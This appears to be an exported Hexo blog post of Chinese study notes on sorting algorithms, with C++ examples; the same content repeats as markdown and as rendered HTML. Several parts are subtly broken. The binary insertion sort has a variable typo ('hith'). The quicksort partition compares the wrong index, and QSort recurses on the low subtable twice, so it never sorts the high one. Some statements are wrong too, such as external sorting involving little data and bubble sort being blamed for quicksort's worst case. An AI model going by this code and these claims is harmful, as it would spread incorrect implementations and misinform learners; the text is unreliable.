输出堆顶元素之后,以堆中最后一个元素替代之,(堆中元素一般用顺序存储结构)\n2. 然后将根节点值与左,右子树的根节点值进行比较,并与区中小者进行交换\n3. 重复上述操作,直到叶子结点,将得到新的堆,称这个从顶堆至叶子的调整过程为”筛选”\n\n##### 大根堆\n\n同上\n\n#### 堆的建立\n\n单节点的二叉树是堆\n\n在完全二叉树中所有以叶子结点(序号i>n/2)为根的子树是堆\n\n这样,只需依次将以序号为n/2,n/2-1,n/2-2,…,1的结点为根的子树均调整为堆即可\n\n##### 时间复杂度O(nlog2n)\n\nO(n)+O(nlog2n)=O(nlog2n)\n\n初始化堆所需时间不超过—O(n)\n\n排序阶段(不含初始化堆)—O(nlog2n)\n\n##### 空间复杂度O(1)\n\n##### 代码实现\n\n```c++\n堆排序\n#include<iostream>\n#include<algorithm>\nusing namespace std;\nclass Heap {//创建堆对象\npublic:\n       void heap(int arr[],int lenth,int index){//创建建立大根堆的函数\n              if (lenth <= 1)\n                      return;//当剩余长度小于等于1的时候推出\n              int left = index * 2 + 1;//左节点等于父节点*2+1\n              int right = index * 2 + 2;//右节点等于父节点*2+2\n              int max = index;//初始化一个max为传入的根节点\n              if (left<lenth && arr[left]>arr[max])\n                      max = left;//判断子节点是否大于父节点,并且更改max指向的值\n              if (right<lenth && arr[right]>arr[max])\n                      max = right;\n              if (arr[index] != arr[max]) {//判断根节点是否为最大值,若不是则交换\n                      swap(arr[index], arr[max]);\n                      heap(arr, lenth, max);//递归调用,将\n              }\n                             \n       }\n       void heapSort(int arr[], int size) {\n              for (int i = size / 2 - 1; i >= 0; i--) {\n                      heap(arr, size, i);//建立一个大根堆\n              }\n              for (int i = size - 1; i >= 1; i--) {\n                      swap(arr[0], arr[i]);\n                      heap(arr, i, 0);//重新调整大根堆\n              }\n       }\n};\nint main() {\n       Heap A;\n       int arr[5] = { 5,7,3,4,8 };\n       A.heapSort(arr, 5);\n       for (int i = 0; i < 5; i++) {\n              cout << arr[i] << endl;\n       }\n       return 0;\n}\n```\n\n### 归并排序\n\n**归并排序是稳定的**\n\n##### 时间复杂度O(nlog2n)\n\n##### 空间复杂度O(n)\n\n因为需要一个与原始序列同样大小的辅助序列,这正是此算法的缺点(归并排序后的值往辅助序列中填)\n\n##### 代码实现(递归)\n\n```c++\n#include<iostream>\n#include<vector>\n//引入vector是为了定义可变数组\nusing namespace std;\nclass Merge {\npublic:\n       void merge(int arr[],int left,int mid,int right) {\n              vector<int> help(right -left+1);\n                  //定义一个长度为right -left+1的数组,进行内排\n                int i = 0;\n              int p1 = left, p2 = mid+1;\n              while (p1 <= mid && p2 <= right) {\n                      help[i++] = arr[p1] < arr[p2] ? arr[p1++] : arr[p2++];\n              }\n              while (p1 <= mid)\n                      help[i++] = arr[p1++];\n              while (p2 <= right)\n                      help[i++] = arr[p2++];\n              for (int j = 0; j < help.size(); j++) {\n                      arr[left+j] = help[j];\n              }\n       }\n       void mergeSort(int arr[],int left,int right) {\n              if (left == right)\n                      return;\n              int mid = left + ((right-left)>> 1);\n              mergeSort(arr, left, mid);\n              mergeSort(arr, mid + 1, right);\n              merge(arr, left, mid, right);\n       }\n};\nint main() {\n       Merge A;\n       int arr[10] = { 3,4,6,1,4,3,6,7,9,87 };\n       A.mergeSort(arr, 0, 9);\n       for (int i = 0; i < 10; i++) {\n              cout <<\"  \"<< arr[i]<<flush;\n       }\n       return 0;\n}\n```\n\n### 基数排序\n\n也叫桶排序或箱排序:设置若干个箱子,将关键字为k的记录放入第k个箱子,然后再按照序号将非空的连接\n\n数字是有范围的,只需要设置0-9十个箱子,相继按照个,十,百,….进行排序\n\n##### 基本思想\n\n分配+收集\n\n##### 步骤\n\n- 第一趟收集保证个位有序\n- 第二趟收集保证十位有序\n- ………..\n\n##### 时间复杂度O(k*(n+m))\n\n- k: 关键字个数\n- m: 关键字取值范围为m个值\n\n##### 空间复杂度O(n+m)\n\n\n\n## 各种常见内排序算法复杂度以及稳定性表格\n\n自己总结完再填\n\n| 排序方法     | 时间复杂度(平均) | 时间复杂度(最坏) | 时间复杂度(最好) | 空间复杂度 | 稳定性 |\n| ------------ | ---------------- | ---------------- | ---------------- | ---------- | ------ |\n| 插入排序     | O(n2)            |                  |                  |            |        |\n| 希尔排序     |                  |                  |                  |            |        |\n| 直接选择排序 |                  |                  |                  |            |        |\n","source":"_posts/排序.md","raw":"---\ntitle: 排序\ndate: 2022-01-07 21:39:01\ncategories: 数据结构\ntags: \n      - 数据结构\n      - c/c++\ntypora-root-url: ..\n---\n\n## 排序\n\n#### 排序的分类\n\n##### 按照存储介质可以分为:\n\n- 内部排序: 数据量不大,数据在内存,无需内外村交换数据\n- 外部排序: 数据量不大,数据在外存 (文件排序)\n\n外部排序时,<!--more-->要将数据分批调入内存来排序,中间结果还要及时放入外存,显然外部排序更复杂\n\n##### 按照比较器个数可以分为:\n\n- 串行排序: 单处理机 (同一时刻比较一对元素)\n- 并行排序: 多处理机 (同一时刻比较多对元素)\n\n##### 按主要操作可分为:\n\n- 比较排序:用比较的方法\n\n插入排序,交换排序,选择排序,归并排序\n\n- 基数排序:不比较元素的大小,仅仅根据元素本身的取值确定其有序位置\n\n##### 按辅助空间可分为:\n\n- 原地排序: 辅助空间用量为O(1)的排序方法\n\n(所占的辅助存储空间与参加排序的数据量大小无关)\n\n- 非原地排序: 辅助空间用量超过O(1)的排序方法\n\n##### 按稳定排序可分为:\n\n- 稳定排序:能够使任何数值相等的元素,排序前后相对次序不变\n- 非稳定排序:不是稳定排序的方法\n\n**排序的稳定性只对结构类型数据排序有意义**,排序方法是否稳定并不能衡量一个排序算法的优劣\n\n##### 按自然性可分为:\n\n- 自然排序:输入数据越有序,排序的速度越快的排序方法\n- 非自然排序:不是自然排序的方法\n\n## 插入排序\n\n### 直接插入排序\n\n边插入边排序,保证子序列都是排好序的,选取元素插入到已经有序的序列中\n\n在插入排序中也可以使用哨兵,0号位置做哨兵\n\n##### 性能分析\n\n基本操作有两个,1.比较关键字大小,2.移动记录\n\n- 最好情况(已经有序)\n\n比较次数n-1,移动次数0\n\n- 最坏情况(逆序有序)\n\n比较次数n(n-1)/2\n\n##### 时间复杂度\n\n原始数据越接近有序,排序速度越快\n\n最坏情况下(逆序有序) O(n2)\n\n最好情况,已经有序,0+1+1+1…… ->O(n)\n\n平均情况下耗时差不多是最坏情况的一半O(n2)\n\n### 折半插入排序\n\n插入位置为high+1\n\n```c++\nvoid BInsertSort(SqList &L){\n    for(int i=2;i<=length;i++){//以此插入第2-n个元素\n        L.r[0]=L.r[i];//当前插入元素存到哨兵位置\n        low =1;high=i-1;//采用二分查找法查找插入位置\n        while(low<=high){\n            mid =(low+high)/2;\n            if(L.r[0].key<L.r[mid].key){\n                hith = mid - 1;           \n            }else{\n                low =mid +1;\n            }            \n        }\n        for(int j=i-1;j>=high+1;--j){\n            L.r[j+1]=L.r[j];//移动元素\n        }\n        L.r[high+1]=L.r[0];//插入到正确位置\n    }\n}\n```\n\n**二分插入排序比较次数与待排序的记录的初始排列状态无关**\n\n在对象的初始排列已经有序或者接近有序的情况下,直接插入排序比较次数比折半插入排序少\n\n减少了比较次数,不能减少移动次数\n\n平均性能优于直接插入排序\n\n##### 时间复杂度\n\nO(n2)\n\n##### 空间复杂度\n\nO(1)\n\n**是一种稳定的排序方法**\n\n### 希尔排序\n\n基本思想:先将整个待排记录序列分割成若干子序列,分别进行直接插入排序,待整个序列中的记录”基本有序”时,再对全体记录进行一次直接插入排序\n\n##### 特点\n\n- 一次移动,移动位置较大,跳跃式地接近排序后的最终位置\n- 最后一次只需要少量移动\n- 增量序列必须是递减的,最后一个必须是1\n- 增量序列应该是**互质**的\n\n以特定间隔的元素分为一组进行插入排序,最后递减成1间隔的插入排序\n\n步骤\n\n- 1.定义增量序列Dk:DM>DM-1>…>D1=1\n- 2.对每个Dk进行”Dk间隔”插入排序\n\n希尔排序算法是一种不稳定的排序算法\n\n##### 时间复杂度\n\nO(n1.25)~O(1.6n1.25) —-经验公式\n\nO(Nlog2N) —平均时间复杂度\n\n最差时间复杂度O(n2)\n\n##### 空间复杂度\n\nO(1) –本质还是插入排序\n\n##### 注意:\n\n- 如何选取最佳增量序列,目前尚未解决\n- 增量因子中除1外没有公因子(也就是增量因子互质)，且最后一个增量因子必须为1\n- 不适合在链式存储结构上实现\n\n## 交换排序\n\n### 冒泡排序\n\n**冒泡排序算法是稳定的**\n\n##### 冒泡排序算法改进\n\n如果某一趟发现没有产生任何交换,则说明该序列已经有序,后面的几趟就不需要比了,所以可以做出冒泡算法的改进\n\n```c++\nvoid bubble_sort(SqList &L){//改进的冒泡算法\n    int m,i,j,flag=1;\n    RedType x;//temp变量\n    for(m=1;m<n-1&&flag==1;m++){\n        flag=0;\n        for(j=1;j<=m;j++){\n            if(L.r[j].key>L.r[j+1].key){//发生逆序\n                flag=1;//发生交换,flag置为1,若本趟没发生交换,flag保持为0\n                x=L.r[j];\n                L.r[j]=L.r[j+1];\n                L.r[j+1]=x;//交换\n            }//endif\n        }//for\n    }//for\n}\n```\n\n**优点**:每趟结束时,不仅能挤出一个最大值到最后面位置,还能同时部分理顺其他元素\n\n##### 时间复杂度\n\n- 最好情况(正序)\n  - 比较次数:n-1\n  - 移动次数:0\n\n时间复杂度 O(n)\n\n- 最坏情况(逆序)\n  - 比较次数:1/2(n2-n)\n  - 移动次数:3/2(n2-n)\n\n时间复杂度O(n2)\n\n**平均时间复杂度O(n2)**\n\n**空间复杂度O(1)**\n\n### 快速排序\n\n**快速排序算法是不稳定的**\n\n**快速排序算法不是自然排序方法**\n\n##### 基本思想:\n\n- 任取一个元素为中心(枢轴)\n- 所有比它小的元素往前放,比他大的元素往后放,形成左右两个子表\n- 对各个子表重新选择中心元素并依次规则调整\n- 直到每个子表的元素只剩一个\n\n```c++\nint Partition(SqList &L,int low,int high){\n    L.r[0]=L.r[low];\n    pivotkey=L.r[low].key;\n    while(low<high){\n        while(low<high&&L.r[high].key>=pivotkey)\n            --high;\n        L.r[low]=L.r[high];\n        while(low<high&&L.r[high].key<=pivotkey)\n            ++low;\n        L.r[high]=L.r[low];\n    }\n    L.r[low]=L.r[0];\n    return low;//返回枢轴最终的位置\n}\nvoid QSort(SqList &L,int low,int high){\n    if(low <high){//low==high即各个子表都只有一个元素\n        pivotloc=Partition(L,low,high);\n        //将L.r[low...high]一分为二,pivotloc为枢轴元素排好序的位置\n        QSort(L,low,pivotloc-1);//对低子表递归排序\n        QSort(L,low,pivotloc-1);//对高子表递归排序     \n    }\n}\nvoid main(){\n\tQSort(L,1,L.length);\n}\n```\n\n##### 时间复杂度O(nlog2n)\n\n- QSort(); ——O(log2n)\n- Partition();——-O(n)\n\n实验结果表明,就平均计算时间而言,快速排序是我们所讨论的所有内排序方法中最好的一个\n\n##### 空间复杂度\n\n快速排序不是原地排序\n\n由于程序中使用了递归,需要递归调用栈的支持,而栈的长度取决于递归调用的深度,(即使不用递归,也需要用用户栈)\n\n- 在平均情况下需要O(log2n)的栈空间\n- 最快情况下:栈空间可达O(n)\n\n##### 注意\n\n- 冒泡排序不适合对原本有序或者基本有序的记录序列进行排序,此时会退化成没有改进的**冒泡排序**时间复杂度O(n2)\n\n### 简单选择排序\n\n**简单选择排序算法是不稳定的**\n\n基本思想:在待排序的数据中选出最大(小)的元素放在其最终的位置\n\n基本操作\n\n1. 首先通过n-1次关键字比较,从n个记录中找出关键字最小的记录,将它与第一个记录交换\n2. 再通过n-2次比较,从剩余的n-1个记录中找出关键字次小的记录,将它与第二个记录交换\n3. 重复上述操作,共进行n-1趟排序后,排序结束\n\n移动次数\n\n- 最好情况 0\n- 最好情况 3(n-1)\n\n**比较次数是”定”值**n(n-1)/2\n\n##### 时间复杂度\n\nO(n2)\n\n### 堆排序\n\n**堆排序是不稳定的**\n\n若在输出对堆顶的最小值(最大值)后,使得剩余n-1个元素的序列又建成一个堆,则得到n个元素的次小值(次大值)….如此反复,便能得到一个有序序列,这个过程称之为堆排序\n\n##### 优点\n\n在数据元素各种情况下时间复杂度都是O(nlog2n)\n\n#### 如何调整剩余元素成为一个新的堆\n\n##### 小根堆\n\n1. 输出堆顶元素之后,以堆中最后一个元素替代之,(堆中元素一般用顺序存储结构)\n2. 然后将根节点值与左,右子树的根节点值进行比较,并与区中小者进行交换\n3. 重复上述操作,直到叶子结点,将得到新的堆,称这个从顶堆至叶子的调整过程为”筛选”\n\n##### 大根堆\n\n同上\n\n#### 堆的建立\n\n单节点的二叉树是堆\n\n在完全二叉树中所有以叶子结点(序号i>n/2)为根的子树是堆\n\n这样,只需依次将以序号为n/2,n/2-1,n/2-2,…,1的结点为根的子树均调整为堆即可\n\n##### 时间复杂度O(nlog2n)\n\nO(n)+O(nlog2n)=O(nlog2n)\n\n初始化堆所需时间不超过—O(n)\n\n排序阶段(不含初始化堆)—O(nlog2n)\n\n##### 空间复杂度O(1)\n\n##### 代码实现\n\n```c++\n堆排序\n#include<iostream>\n#include<algorithm>\nusing namespace std;\nclass Heap {//创建堆对象\npublic:\n       void heap(int arr[],int lenth,int index){//创建建立大根堆的函数\n              if (lenth <= 1)\n                      return;//当剩余长度小于等于1的时候推出\n              int left = index * 2 + 1;//左节点等于父节点*2+1\n              int right = index * 2 + 2;//右节点等于父节点*2+2\n              int max = index;//初始化一个max为传入的根节点\n              if (left<lenth && arr[left]>arr[max])\n                      max = left;//判断子节点是否大于父节点,并且更改max指向的值\n              if (right<lenth && arr[right]>arr[max])\n                      max = right;\n              if (arr[index] != arr[max]) {//判断根节点是否为最大值,若不是则交换\n                      swap(arr[index], arr[max]);\n                      heap(arr, lenth, max);//递归调用,将\n              }\n                             \n       }\n       void heapSort(int arr[], int size) {\n              for (int i = size / 2 - 1; i >= 0; i--) {\n                      heap(arr, size, i);//建立一个大根堆\n              }\n              for (int i = size - 1; i >= 1; i--) {\n                      swap(arr[0], arr[i]);\n                      heap(arr, i, 0);//重新调整大根堆\n              }\n       }\n};\nint main() {\n       Heap A;\n       int arr[5] = { 5,7,3,4,8 };\n       A.heapSort(arr, 5);\n       for (int i = 0; i < 5; i++) {\n              cout << arr[i] << endl;\n       }\n       return 0;\n}\n```\n\n### 归并排序\n\n**归并排序是稳定的**\n\n##### 时间复杂度O(nlog2n)\n\n##### 空间复杂度O(n)\n\n因为需要一个与原始序列同样大小的辅助序列,这正是此算法的缺点(归并排序后的值往辅助序列中填)\n\n##### 代码实现(递归)\n\n```c++\n#include<iostream>\n#include<vector>\n//引入vector是为了定义可变数组\nusing namespace std;\nclass Merge {\npublic:\n       void merge(int arr[],int left,int mid,int right) {\n              vector<int> help(right -left+1);\n                  //定义一个长度为right -left+1的数组,进行内排\n                int i = 0;\n              int p1 = left, p2 = mid+1;\n              while (p1 <= mid && p2 <= right) {\n                      help[i++] = arr[p1] < arr[p2] ? arr[p1++] : arr[p2++];\n              }\n              while (p1 <= mid)\n                      help[i++] = arr[p1++];\n              while (p2 <= right)\n                      help[i++] = arr[p2++];\n              for (int j = 0; j < help.size(); j++) {\n                      arr[left+j] = help[j];\n              }\n       }\n       void mergeSort(int arr[],int left,int right) {\n              if (left == right)\n                      return;\n              int mid = left + ((right-left)>> 1);\n              mergeSort(arr, left, mid);\n              mergeSort(arr, mid + 1, right);\n              merge(arr, left, mid, right);\n       }\n};\nint main() {\n       Merge A;\n       int arr[10] = { 3,4,6,1,4,3,6,7,9,87 };\n       A.mergeSort(arr, 0, 9);\n       for (int i = 0; i < 10; i++) {\n              cout <<\"  \"<< arr[i]<<flush;\n       }\n       return 0;\n}\n```\n\n### 基数排序\n\n也叫桶排序或箱排序:设置若干个箱子,将关键字为k的记录放入第k个箱子,然后再按照序号将非空的连接\n\n数字是有范围的,只需要设置0-9十个箱子,相继按照个,十,百,….进行排序\n\n##### 基本思想\n\n分配+收集\n\n##### 步骤\n\n- 第一趟收集保证个位有序\n- 第二趟收集保证十位有序\n- ………..\n\n##### 时间复杂度O(k*(n+m))\n\n- k: 关键字个数\n- m: 关键字取值范围为m个值\n\n##### 空间复杂度O(n+m)\n\n\n\n## 各种常见内排序算法复杂度以及稳定性表格\n\n自己总结完再填\n\n| 排序方法     | 时间复杂度(平均) | 时间复杂度(最坏) | 时间复杂度(最好) | 空间复杂度 | 稳定性 |\n| ------------ | ---------------- | ---------------- | ---------------- | ---------- | ------ |\n| 插入排序     | O(n2)            |                  |                  |            |        |\n| 希尔排序     |                  |                  |                  |            |        |\n| 直接选择排序 |                  |                  |                  |            |        |\n","slug":"排序","published":1,"updated":"2022-01-07T13:51:46.802Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9nc002bgsw91zw94vts","content":"<h2 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h2><h4 id=\"排序的分类\"><a href=\"#排序的分类\" class=\"headerlink\" title=\"排序的分类\"></a>排序的分类</h4><h5 id=\"按照存储介质可以分为\"><a href=\"#按照存储介质可以分为\" class=\"headerlink\" title=\"按照存储介质可以分为:\"></a>按照存储介质可以分为:</h5><ul>\n<li>内部排序: 数据量不大,数据在内存,无需内外村交换数据</li>\n<li>外部排序: 数据量不大,数据在外存 (文件排序)</li>\n</ul>\n<p>外部排序时,<span id=\"more\"></span>要将数据分批调入内存来排序,中间结果还要及时放入外存,显然外部排序更复杂</p>\n<h5 id=\"按照比较器个数可以分为\"><a href=\"#按照比较器个数可以分为\" class=\"headerlink\" title=\"按照比较器个数可以分为:\"></a>按照比较器个数可以分为:</h5><ul>\n<li>串行排序: 单处理机 (同一时刻比较一对元素)</li>\n<li>并行排序: 多处理机 (同一时刻比较多对元素)</li>\n</ul>\n<h5 id=\"按主要操作可分为\"><a href=\"#按主要操作可分为\" class=\"headerlink\" title=\"按主要操作可分为:\"></a>按主要操作可分为:</h5><ul>\n<li>比较排序:用比较的方法</li>\n</ul>\n<p>插入排序,交换排序,选择排序,归并排序</p>\n<ul>\n<li>基数排序:不比较元素的大小,仅仅根据元素本身的取值确定其有序位置</li>\n</ul>\n<h5 id=\"按辅助空间可分为\"><a href=\"#按辅助空间可分为\" class=\"headerlink\" title=\"按辅助空间可分为:\"></a>按辅助空间可分为:</h5><ul>\n<li>原地排序: 辅助空间用量为O(1)的排序方法</li>\n</ul>\n<p>(所占的辅助存储空间与参加排序的数据量大小无关)</p>\n<ul>\n<li>非原地排序: 辅助空间用量超过O(1)的排序方法</li>\n</ul>\n<h5 id=\"按稳定排序可分为\"><a href=\"#按稳定排序可分为\" class=\"headerlink\" title=\"按稳定排序可分为:\"></a>按稳定排序可分为:</h5><ul>\n<li>稳定排序:能够使任何数值相等的元素,排序前后相对次序不变</li>\n<li>非稳定排序:不是稳定排序的方法</li>\n</ul>\n<p><strong>排序的稳定性只对结构类型数据排序有意义</strong>,排序方法是否稳定并不能衡量一个排序算法的优劣</p>\n<h5 id=\"按自然性可分为\"><a href=\"#按自然性可分为\" class=\"headerlink\" title=\"按自然性可分为:\"></a>按自然性可分为:</h5><ul>\n<li>自然排序:输入数据越有序,排序的速度越快的排序方法</li>\n<li>非自然排序:不是自然排序的方法</li>\n</ul>\n<h2 id=\"插入排序\"><a href=\"#插入排序\" class=\"headerlink\" title=\"插入排序\"></a>插入排序</h2><h3 id=\"直接插入排序\"><a href=\"#直接插入排序\" class=\"headerlink\" title=\"直接插入排序\"></a>直接插入排序</h3><p>边插入边排序,保证子序列都是排好序的,选取元素插入到已经有序的序列中</p>\n<p>在插入排序中也可以使用哨兵,0号位置做哨兵</p>\n<h5 id=\"性能分析\"><a href=\"#性能分析\" class=\"headerlink\" title=\"性能分析\"></a>性能分析</h5><p>基本操作有两个,1.比较关键字大小,2.移动记录</p>\n<ul>\n<li>最好情况(已经有序)</li>\n</ul>\n<p>比较次数n-1,移动次数0</p>\n<ul>\n<li>最坏情况(逆序有序)</li>\n</ul>\n<p>比较次数n(n-1)/2</p>\n<h5 id=\"时间复杂度\"><a href=\"#时间复杂度\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><p>原始数据越接近有序,排序速度越快</p>\n<p>最坏情况下(逆序有序) O(n2)</p>\n<p>最好情况,已经有序,0+1+1+1…… -&gt;O(n)</p>\n<p>平均情况下耗时差不多是最坏情况的一半O(n2)</p>\n<h3 id=\"折半插入排序\"><a href=\"#折半插入排序\" class=\"headerlink\" title=\"折半插入排序\"></a>折半插入排序</h3><p>插入位置为high+1</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BInsertSort</span><span class=\"params\">(SqList &amp;L)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">2</span>;i&lt;=length;i++)&#123;<span class=\"comment\">//以此插入第2-n个元素</span></span><br><span class=\"line\">        L.r[<span class=\"number\">0</span>]=L.r[i];<span class=\"comment\">//当前插入元素存到哨兵位置</span></span><br><span class=\"line\">        low =<span class=\"number\">1</span>;high=i<span class=\"number\">-1</span>;<span class=\"comment\">//采用二分查找法查找插入位置</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(low&lt;=high)&#123;</span><br><span class=\"line\">            mid =(low+high)/<span class=\"number\">2</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(L.r[<span class=\"number\">0</span>].key&lt;L.r[mid].key)&#123;</span><br><span class=\"line\">                hith = mid - <span class=\"number\">1</span>;           </span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                low =mid +<span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125;            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=i<span class=\"number\">-1</span>;j&gt;=high+<span class=\"number\">1</span>;--j)&#123;</span><br><span class=\"line\">            L.r[j+<span class=\"number\">1</span>]=L.r[j];<span class=\"comment\">//移动元素</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        L.r[high+<span class=\"number\">1</span>]=L.r[<span class=\"number\">0</span>];<span class=\"comment\">//插入到正确位置</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>二分插入排序比较次数与待排序的记录的初始排列状态无关</strong></p>\n<p>在对象的初始排列已经有序或者接近有序的情况下,直接插入排序比较次数比折半插入排序少</p>\n<p>减少了比较次数,不能减少移动次数</p>\n<p>平均性能优于直接插入排序</p>\n<h5 id=\"时间复杂度-1\"><a href=\"#时间复杂度-1\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><p>O(n2)</p>\n<h5 id=\"空间复杂度\"><a href=\"#空间复杂度\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h5><p>O(1)</p>\n<p><strong>是一种稳定的排序方法</strong></p>\n<h3 id=\"希尔排序\"><a href=\"#希尔排序\" class=\"headerlink\" title=\"希尔排序\"></a>希尔排序</h3><p>基本思想:先将整个待排记录序列分割成若干子序列,分别进行直接插入排序,待整个序列中的记录”基本有序”时,再对全体记录进行一次直接插入排序</p>\n<h5 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h5><ul>\n<li>一次移动,移动位置较大,跳跃式地接近排序后的最终位置</li>\n<li>最后一次只需要少量移动</li>\n<li>增量序列必须是递减的,最后一个必须是1</li>\n<li>增量序列应该是<strong>互质</strong>的</li>\n</ul>\n<p>以特定间隔的元素分为一组进行插入排序,最后递减成1间隔的插入排序</p>\n<p>步骤</p>\n<ul>\n<li>1.定义增量序列Dk:DM&gt;DM-1&gt;…&gt;D1=1</li>\n<li>2.对每个Dk进行”Dk间隔”插入排序</li>\n</ul>\n<p>希尔排序算法是一种不稳定的排序算法</p>\n<h5 id=\"时间复杂度-2\"><a href=\"#时间复杂度-2\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><p>O(n1.25)~O(1.6n1.25) —-经验公式</p>\n<p>O(Nlog2N) —平均时间复杂度</p>\n<p>最差时间复杂度O(n2)</p>\n<h5 id=\"空间复杂度-1\"><a href=\"#空间复杂度-1\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h5><p>O(1) –本质还是插入排序</p>\n<h5 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意:\"></a>注意:</h5><ul>\n<li>如何选取最佳增量序列,目前尚未解决</li>\n<li>增量因子中除1外没有公因子(也就是增量因子互质)，且最后一个增量因子必须为1</li>\n<li>不适合在链式存储结构上实现</li>\n</ul>\n<h2 id=\"交换排序\"><a href=\"#交换排序\" class=\"headerlink\" title=\"交换排序\"></a>交换排序</h2><h3 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h3><p><strong>冒泡排序算法是稳定的</strong></p>\n<h5 id=\"冒泡排序算法改进\"><a href=\"#冒泡排序算法改进\" class=\"headerlink\" title=\"冒泡排序算法改进\"></a>冒泡排序算法改进</h5><p>如果某一趟发现没有产生任何交换,则说明该序列已经有序,后面的几趟就不需要比了,所以可以做出冒泡算法的改进</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">bubble_sort</span><span class=\"params\">(SqList &amp;L)</span></span>&#123;<span class=\"comment\">//改进的冒泡算法</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> m,i,j,flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">    RedType x;<span class=\"comment\">//temp变量</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(m=<span class=\"number\">1</span>;m&lt;n<span class=\"number\">-1</span>&amp;&amp;flag==<span class=\"number\">1</span>;m++)&#123;</span><br><span class=\"line\">        flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(j=<span class=\"number\">1</span>;j&lt;=m;j++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(L.r[j].key&gt;L.r[j+<span class=\"number\">1</span>].key)&#123;<span class=\"comment\">//发生逆序</span></span><br><span class=\"line\">                flag=<span class=\"number\">1</span>;<span class=\"comment\">//发生交换,flag置为1,若本趟没发生交换,flag保持为0</span></span><br><span class=\"line\">                x=L.r[j];</span><br><span class=\"line\">                L.r[j]=L.r[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">                L.r[j+<span class=\"number\">1</span>]=x;<span class=\"comment\">//交换</span></span><br><span class=\"line\">            &#125;<span class=\"comment\">//endif</span></span><br><span class=\"line\">        &#125;<span class=\"comment\">//for</span></span><br><span class=\"line\">    &#125;<span class=\"comment\">//for</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>优点</strong>:每趟结束时,不仅能挤出一个最大值到最后面位置,还能同时部分理顺其他元素</p>\n<h5 id=\"时间复杂度-3\"><a href=\"#时间复杂度-3\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><ul>\n<li>最好情况(正序)<ul>\n<li>比较次数:n-1</li>\n<li>移动次数:0</li>\n</ul>\n</li>\n</ul>\n<p>时间复杂度 O(n)</p>\n<ul>\n<li>最坏情况(逆序)<ul>\n<li>比较次数:1/2(n2-n)</li>\n<li>移动次数:3/2(n2-n)</li>\n</ul>\n</li>\n</ul>\n<p>时间复杂度O(n2)</p>\n<p><strong>平均时间复杂度O(n2)</strong></p>\n<p><strong>空间复杂度O(1)</strong></p>\n<h3 id=\"快速排序\"><a href=\"#快速排序\" class=\"headerlink\" title=\"快速排序\"></a>快速排序</h3><p><strong>快速排序算法是不稳定的</strong></p>\n<p><strong>快速排序算法不是自然排序方法</strong></p>\n<h5 id=\"基本思想\"><a href=\"#基本思想\" class=\"headerlink\" title=\"基本思想:\"></a>基本思想:</h5><ul>\n<li>任取一个元素为中心(枢轴)</li>\n<li>所有比它小的元素往前放,比他大的元素往后放,形成左右两个子表</li>\n<li>对各个子表重新选择中心元素并依次规则调整</li>\n<li>直到每个子表的元素只剩一个</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 